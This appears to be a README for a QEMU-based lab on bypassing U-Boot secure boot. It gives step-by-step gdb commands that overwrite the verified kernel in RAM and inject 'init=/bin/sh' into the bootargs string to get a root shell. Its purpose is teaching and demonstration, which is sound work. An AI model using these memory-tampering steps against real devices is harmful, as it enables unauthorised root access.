# Dependancies

- QEMU ARM (version 7.0 or later)
- Aarch64 cross compiler (gcc-aarch64-linux-gnu)
- mtools (for copying files to the SD card image)
- Openssl (for generating keys and signing the FIT image)
- dosfstools (for creating the FAT filesystem on the SD card image)
- gdb-multiarch (for simulating the RAM writing)

# Build Lab

- Pull u-boot source :
    ```
    git clone https://github.com/u-boot/u-boot.git
    ```
- Pull buildroot source (or any linux kernel source) :
    ```
    git clone https://github.com/buildroot/buildroot.git
    ```

- tree structure should be like this :
    ```
    ├── buildroot
    ├── u-boot
    └── src
        ├── setup_lab.sh
        └── ...
    ```

- Run the setup script to build u-boot and buildroot :
    ```
    cd src
    chmod +x setup_lab.sh
    ./setup_lab.sh setup
    ```
#### WARNING : The setup process will take a long time to complete if you did not build u-boot and buildroot already, so please be patient.

- After the setup is done, you can run the following command to run the lab :
    ```
    ./setup_lab.sh run
    ```

- To clean the build files, you can run the following command :
    ```
    ./setup_lab.sh clean
    ```

# Pwned the lab

The pwned.bin is a simple payload that is meant to be written into the RAM at the right timing just after the kernel is verified and loaded. We will overwrite the address of the loaded kernel in the RAM with our payload, which will just print a message and stop.

Before the attack, run `make pwned` to build the pwned.bin payload.

To do this, run `./setup_lab.sh attack` and the following command in another terminal :
    
```
gdb-multiarch
```

then we need to connect to the qemu gdb server, which is running on port 1234 by default, so run the following command in gdb :
```
target remote localhost:1234
```

We need to put a breakpoint at the beginning of the kernel, which will be located at address 0x40200000, so run the following command in gdb :
```
hb *0x40200000
```

We start the machine (which is waiting) by typing `c` in gdb. The machine will freeze after `Starting kernel ...`. 

Now, we just have to write our payload into the RAM at the right address, which is 0x40200000, so we can use the command:
```
restore pwned.bin binary 0x40200000
```
Now we can continue the execution of the machine by typing `c` in gdb.

# Attack the lab to get a root shell

Same start as the previous attack, but instead of writing our payload at the address of the kernel, we will write it in the bootargs variable, which is used by the kernel to get the boot arguments.

We need to find where is located the bootargs variable in the memory. In a real attack, we would need to reverse engineer the u-boot binary to find the address of the bootargs variable, but in this lab, we can find it by using the command:

```
find $x0, +0x100000, "root=/dev/vdb"
```

This will return the address of the string "root=/dev/vdb", which is located in the bootargs variable. However, we can not overwrite this string because the kernel needs it to boot, so we need to find another place to write our payload, which will be `init=/bin/sh`, giving us a root shell on the machine. 

We need to find the whole bootargs string to see if we have enough space to write our payload, so we can use the command:

```
x/s OUTPUT_OF_FIND_COMMAND - 42 (test with 10 and increase to get the whole string)
```

This will return the whole bootargs string `console=ttyAMA0 earlycon=pl011,0x09000000 root=/dev/vdb`. We can see that we can override the earlycon part with our payload. WARNING: Make sure to override all the earlycon part with our payload, otherwise there will be artefacts of the command in the bootargs, which will cause the kernel to not boot properly. So we need to write `init=/bin/sh` and fill the rest of the earlycon part with space. The final payload will look like this:

```
init=/bin/sh             
```

Now we need to write it at the correct address, which is the address of the bootargs string + the offset of the earlycon part in the bootargs string. In our case, the offset is 16, so we need to write our payload at the address of the bootargs string + 16. We can use the command:

```
set {char[25]} (ADDRESS_OF_BOOTARGS_STRING + 16) = "init=/bin/sh             "
```

Now we can continue the execution of the machine by typing `c` in gdb, and we should have a root shell on the machine.

# Conclusion

This demonstrate that even with secure boot enabled, the attacker can still write into memory and bypass the security to obtain a root shell on the machine.

In this lab, we have used GDB to write into the RAM and to the right timing. In reality, attacker will exploit a DMA access to write into the RAM, which is more complex but the principle is the same. The attacker will need to find the right timing to write into the RAM, which is when the kernel is loading and before it is fully initialized. This can be done by writing periodically into the right address and hoping to hit the right timing.
